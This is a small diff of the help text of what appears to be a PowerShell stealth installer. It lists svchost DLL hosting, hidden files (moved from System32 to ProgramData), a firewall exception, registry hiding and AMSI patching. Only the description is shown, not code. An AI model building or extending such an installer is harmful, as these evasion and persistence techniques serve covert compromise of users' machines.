@@ -5,7 +5,7 @@
 .DESCRIPTION
     This script performs complete stealth installation including:
     - Svchost.exe hosting (DLL mode) or standalone
-    - Hidden file installation in System32
+    - Hidden file installation under ProgramData
     - Windows Firewall exception
     - Registry hiding
     - AMSI patching
